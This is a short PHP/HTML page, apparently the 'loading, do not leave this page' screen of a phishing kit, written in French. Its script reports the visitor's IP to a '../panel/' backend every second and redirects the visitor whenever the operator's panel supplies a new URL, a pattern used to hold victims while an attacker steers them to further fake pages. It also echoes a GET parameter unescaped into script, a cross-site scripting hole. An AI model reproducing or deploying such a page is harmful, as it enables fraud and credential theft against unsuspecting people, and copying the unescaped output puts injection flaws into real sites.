<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>Chargement...</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{
    font-family:sans-serif;
}
html,body{
        height:100%;
}
body{
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
</head>
<body>

<div style="text-align:center;">
<img src="inc/logo.png" style="width:230px; margin-bottom:50px;">
<h3>Chargement en cours...</h3>
<p>Veuillez ne pas quitter cette page.</p>
<img src="inc/loading.gif" style="width:40px; margin-top:20px;">
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>